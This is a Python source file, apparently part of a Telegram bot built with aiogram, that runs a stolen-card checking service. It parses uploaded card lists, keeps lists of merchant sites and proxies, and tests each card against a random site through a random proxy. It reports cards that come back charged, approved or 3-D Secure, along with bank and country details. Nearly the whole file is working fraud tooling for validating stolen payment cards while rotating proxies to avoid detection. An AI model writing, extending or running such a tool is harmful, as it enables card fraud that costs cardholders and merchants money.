    if int_uid in active_processes and active_processes[int_uid].get('type') not in [
        'waiting_sites', 'waiting_proxies', 'waiting_cards'
    ]:
        return await cq.answer("❌ You already have an active process!", show_alert=True)

    proxies_data = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies_data.get(user_id, [])
    if not user_proxies:
        return await cq.answer("❌ You need at least one working proxy!", show_alert=True)

    sites_data = await load_json(USER_SITES_FILE)
    user_sites = sites_data.get(user_id, [])
    if not user_sites:
        return await cq.answer("❌ You have no sites to test!", show_alert=True)

    active_processes[int_uid] = {'type': 'testing_sites'}

    try:
        await cq.message.edit_text("🍑 Preparing to test your sites...")
    except:
        pass

    proxy = random.choice(user_proxies)['url']
    working, dead = [], []

    for i, site in enumerate(user_sites, 1):
        try:
            await cq.message.edit_text(f"🍑 Testing sites... [{i}/{len(user_sites)}]")
        except:
            pass
        result = await test_site_via_api(site, proxy)
        (working if result.get('working') else dead).append(site)
        await asyncio.sleep(0.5)

    if dead:
        sites_data[user_id] = working
        await save_json(USER_SITES_FILE, sites_data)

    text = (
        "𖣐━━━━━━━━━━━━━━𖣐\n"
        f"✅ {format_bold('SITE TEST COMPLETE')}\n"
        "𖣐━━━━━━━━━━━━━━𖣐\n\n"
        f"📊 Total: {len(user_sites)} | 🟢 Working: {len(working)} | 🔴 Dead: {len(dead)}\n"
    )
    if dead:
        text += f"\n🔴 Dead removed:\n" + "".join(f"• `{s}`\n" for s in dead[:5])
        if len(dead) > 5:
            text += f"... and {len(dead)-5} more\n"

    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
    except:
        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")

    active_processes.pop(int_uid, None)

async def _start_test_proxies(cq: CallbackQuery):
    user_id = str(cq.from_user.id)
    int_uid  = cq.from_user.id

    if int_uid in active_processes and active_processes[int_uid].get('type') not in [
        'waiting_sites', 'waiting_proxies', 'waiting_cards'
    ]:
        return await cq.answer("❌ You already have an active process!", show_alert=True)

    proxies_data = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies_data.get(user_id, [])
    if not user_proxies:
        return await cq.answer("❌ You have no proxies to test!", show_alert=True)

    active_processes[int_uid] = {'type': 'testing_proxies'}

    try:
        await cq.message.edit_text("🍑 Preparing to test your proxies...")
    except:
        pass

    working, dead = [], []
    for i, pd in enumerate(user_proxies, 1):
        try:
            await cq.message.edit_text(f"🍑 Testing proxies... [{i}/{len(user_proxies)}]")
        except:
            pass
        ok, _ = await test_proxy(pd['url'])
        (working if ok else dead).append(pd)
        await asyncio.sleep(0.5)

    if dead:
        proxies_data[user_id] = working
        await save_json(USER_PROXIES_FILE, proxies_data)

    text = (
        "𖣐━━━━━━━━━━━━━━𖣐\n"
        f"✅ {format_bold('PROXY TEST COMPLETE')}\n"
        "𖣐━━━━━━━━━━━━━━𖣐\n\n"
        f"📊 Total: {len(user_proxies)} | 🟢 Working: {len(working)} | 🔴 Dead: {len(dead)}\n"
    )
    if dead:
        text += "\n🔴 Dead removed:\n" + "".join(f"• `{p['original']}`\n" for p in dead[:5])
        if len(dead) > 5:
            text += f"... and {len(dead)-5} more\n"

    try:
        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
    except:
        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")

    active_processes.pop(int_uid, None)

# ==================== MESSAGE HANDLER (files + text) ====================

@dp.message(F.document | F.text)
async def handle_message(message: Message):
    user_id = message.from_user.id

    if user_id not in active_processes:
        return

    ptype = active_processes[user_id].get('type')

    if message.document:
        if ptype == 'waiting_cards':
            await process_cards_file(message)
        elif ptype == 'waiting_sites':
            await process_sites_file(message)
        elif ptype == 'waiting_proxies':
            await process_proxies_file(message)
    elif message.text and not message.text.startswith('/'):
        if ptype == 'waiting_sites':
            await process_sites_text(message)
        elif ptype == 'waiting_proxies':
            await process_proxies_text(message)

# ==================== FILE PROCESSORS ====================

async def _download_doc(message: Message) -> str | None:
    if not message.document:
        return None
    file_info = await bot.get_file(message.document.file_id)
    path = f"/tmp/{message.document.file_name or 'upload.txt'}"
    await bot.download_file(file_info.file_path, path)
    return path

async def _read_file(path: str) -> str:
    try:
        async with aiofiles.open(path, 'r', encoding='utf-8') as f:
            return await f.read()
    except:
        async with aiofiles.open(path, 'r', encoding='latin-1') as f:
            return await f.read()

async def process_cards_file(message: Message):
    user_id = message.from_user.id
    str_uid = str(user_id)

    path = await _download_doc(message)
    if not path:
        return
    content = await _read_file(path)
    os.remove(path)

    if len(content.splitlines()) > MAX_CARDS_FILE:
        await message.reply(f"❌ File too large. Max {MAX_CARDS_FILE} cards.")
        active_processes.pop(user_id, None)
        return

    cards = extract_cards(content)
    if not cards:
        await message.reply("`❌ No valid cards found in file!`", parse_mode="Markdown")
        active_processes.pop(user_id, None)
        return

    sites_data   = await load_json(USER_SITES_FILE)
    proxies_data = await load_json(USER_PROXIES_FILE)
    user_sites   = sites_data.get(str_uid, [])
    user_proxies = proxies_data.get(str_uid, [])

    if not user_sites:
        await message.reply("❌ No saved sites. Add sites first.")
        active_processes.pop(user_id, None)
        return
    if not user_proxies:
        await message.reply("❌ No saved proxies. Add proxies first.")
        active_processes.pop(user_id, None)
        return

    active_processes[user_id]['type'] = 'checking_cards'
    await process_card_check(message, cards[:MAX_CARDS], user_sites, user_proxies)

async def process_sites_file(message: Message):
    user_id = message.from_user.id
    str_uid = str(user_id)

    path = await _download_doc(message)
    if not path:
        await message.reply("❌ Failed to download file.")
        active_processes.pop(user_id, None)
        return
    content = await _read_file(path)
    os.remove(path)

    await _process_sites_content(message, content, str_uid, user_id)

async def process_sites_text(message: Message):
    user_id = message.from_user.id
    str_uid = str(user_id)
    content = message.text.strip()
    await _process_sites_content(message, content, str_uid, user_id)

async def _process_sites_content(message: Message, content: str, str_uid: str, user_id: int):
    lines = content.splitlines()
    if len(lines) > MAX_SITES_FILE:
        await message.reply(f"❌ Too many sites. Max {MAX_SITES_FILE}.")
        active_processes.pop(user_id, None)
        return

    sites_to_test = []
    for line in lines:
        line = line.strip().replace('https://', '').replace('http://', '').split('/')[0]
        if line and re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', line):
            sites_to_test.append(line)

    if not sites_to_test:
        await message.reply("❌ No valid sites found.")
        active_processes.pop(user_id, None)
        return

    proxies_data = await load_json(USER_PROXIES_FILE)
    user_proxies = proxies_data.get(str_uid, [])
    if not user_proxies:
        await message.reply("❌ You need at least one working proxy.")
        active_processes.pop(user_id, None)
        return

    status_msg = await message.reply(f"🍑 Testing {len(sites_to_test)} sites...")
    proxy = random.choice(user_proxies)['url']
    working = []

    for i, site in enumerate(sites_to_test, 1):
        try:
            await status_msg.edit_text(f"🍑 Testing sites... [{i}/{len(sites_to_test)}]")
        except:
            pass
        result = await test_site_via_api(site, proxy)
        if result.get('working'):
            working.append(site)
        await asyncio.sleep(0.5)

    sites_data = await load_json(USER_SITES_FILE)
    current = sites_data.get(str_uid, [])
    added = []
    for site in working:
        if site not in current and len(current) < MAX_SITES:
            current.append(site)
            added.append(site)
        if len(current) >= MAX_SITES:
            break

    if added:
        sites_data[str_uid] = current
        await save_json(USER_SITES_FILE, sites_data)

    resp = (
        "━━━━━━━━━━━━━━━━━\n✅ SITES PROCESSED\n━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total sent: {len(sites_to_test)}\n"
        f"🟢 Working: {len(working)}\n"
        f"✅ Added: {len(added)}\n"
        f"📊 Total now: {len(current)}/{MAX_SITES}\n"
    )
    if added:
        resp += "\nAdded:\n" + "".join(f"• `{s}`\n" for s in added[:5])
        if len(added) > 5:
            resp += f"... and {len(added)-5} more\n"

    await status_msg.edit_text(resp, reply_markup=kb_back_main(), parse_mode="Markdown")
    active_processes.pop(user_id, None)

async def process_proxies_file(message: Message):
    user_id = message.from_user.id
    str_uid = str(user_id)

    path = await _download_doc(message)
    if not path:
        await message.reply("❌ Failed to download file.")
        active_processes.pop(user_id, None)
        return
    content = await _read_file(path)
    os.remove(path)

    await _process_proxies_content(message, content, str_uid, user_id)

async def process_proxies_text(message: Message):
    user_id = message.from_user.id
    str_uid = str(user_id)
    content = message.text.strip()
    await _process_proxies_content(message, content, str_uid, user_id)

async def _process_proxies_content(message: Message, content: str, str_uid: str, user_id: int):
    lines = content.splitlines()
    if len(lines) > MAX_PROXIES_FILE:
        await message.reply(f"❌ Too many proxies. Max {MAX_PROXIES_FILE}.")
        active_processes.pop(user_id, None)
        return

    proxies_to_test = []
    for line in lines:
        line = line.strip()
        if line:
            url = parse_proxy(line)
            if url:
                proxies_to_test.append((line, url))

    if not proxies_to_test:
        await message.reply("❌ No valid proxies found.")
        active_processes.pop(user_id, None)
        return

    status_msg = await message.reply(f"🍑 Testing {len(proxies_to_test)} proxies...")
    working = []

    for i, (orig, url) in enumerate(proxies_to_test, 1):
        try:
            await status_msg.edit_text(f"🍑 Testing proxies... [{i}/{len(proxies_to_test)}]")
        except:
            pass
        ok, ip = await test_proxy(url)
        if ok:
            working.append({'original': orig, 'url': url, 'ip': ip})
        await asyncio.sleep(0.5)

    proxies_data = await load_json(USER_PROXIES_FILE)
    current = proxies_data.get(str_uid, [])
    added = []
    for p in working:
        if not any(x['original'] == p['original'] for x in current) and len(current) < MAX_PROXIES:
            current.append(p)
            added.append(p['original'])
        if len(current) >= MAX_PROXIES:
            break

    if added:
        proxies_data[str_uid] = current
        await save_json(USER_PROXIES_FILE, proxies_data)

    resp = (
        "━━━━━━━━━━━━━━━━━\n✅ PROXIES PROCESSED\n━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Total sent: {len(proxies_to_test)}\n"
        f"🟢 Working: {len(working)}\n"
        f"✅ Added: {len(added)}\n"
        f"📊 Total now: {len(current)}/{MAX_PROXIES}\n"
    )
    if added:
        resp += "\nAdded:\n" + "".join(f"• `{p}`\n" for p in added[:5])
        if len(added) > 5:
            resp += f"... and {len(added)-5} more\n"

    await status_msg.edit_text(resp, reply_markup=kb_back_main(), parse_mode="Markdown")
    active_processes.pop(user_id, None)

# ==================== CARD CHECKER ====================

async def process_card_check(message: Message, cards: list, sites: list, proxies: list):
    user_id = message.from_user.id
    total = len(cards)
    checked = approved = charged = threed = declined = 0

    status_msg = await message.reply("`🍑 Preparing your lunch...`", parse_mode="Markdown")

    try:
        for card in cards:
            if user_id not in active_processes or \
               active_processes[user_id].get('type') != 'checking_cards':
                break
            if not sites:
                break

            site  = random.choice(sites)
            proxy = random.choice(proxies)['url']
            result = await check_card_via_api(card, site, proxy)
            checked += 1

            if isinstance(result, Exception):
                declined += 1
                await asyncio.sleep(3)
                continue

            status = get_card_status(result.get('Response', ''), result.get('Status', ''))

            if status:
                if "CHARGED"  in status: charged  += 1
                elif "APPROVED" in status: approved += 1
                elif "3D"     in status: threed   += 1

                bin_info = await get_bin_info(card.split('|')[0])
                card_msg = (
                    f"{status}\n\n"
                    f"CC ⇾ `{card}`\n"
                    f"Gateway ⇾ {result.get('Gateway', 'Unknown')}\n"
                    f"Response ⇾ {result.get('Response', 'Unknown')}\n"
                    f"Price ⇾ {result.get('Price', '-')} 💸\n\n"
                    f"```BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                    f"Bank: {bin_info['bank']}\n"
                    f"Country: {bin_info['country']} {bin_info['flag']}```"
                )
                await message.reply(card_msg, parse_mode="Markdown")
            else:
                declined += 1

            try:
                await status_msg.edit_text(
                    "`🍑 Progress`",
                    parse_mode="Markdown",
                    reply_markup=kb_progress(
                        card, result.get('Response', '')[:28],
                        charged, approved, threed, declined,
                        checked, total, user_id
                    )
                )
            except:
                pass

            await asyncio.sleep(3)

    finally:
        active_processes.pop(user_id, None)
        final = (
            "```✅ CHECK COMPLETE!\n\n"
            f"Total Cards : {total}\n"
            f"CHARGED 💎  : {charged}\n"
            f"APPROVED ✅  : {approved}\n"
            f"3D SECURE 🟡: {threed}\n"
            f"DECLINED ❌  : {declined}```"
        )
        try:
            await status_msg.edit_text(final, parse_mode="Markdown")
        except:
            await message.reply(final, parse_mode="Markdown")

# ==================== MAIN ====================

async def main():
    print("""
Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
Telegram: @afuonax
Starting bot with aiogram...
""")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
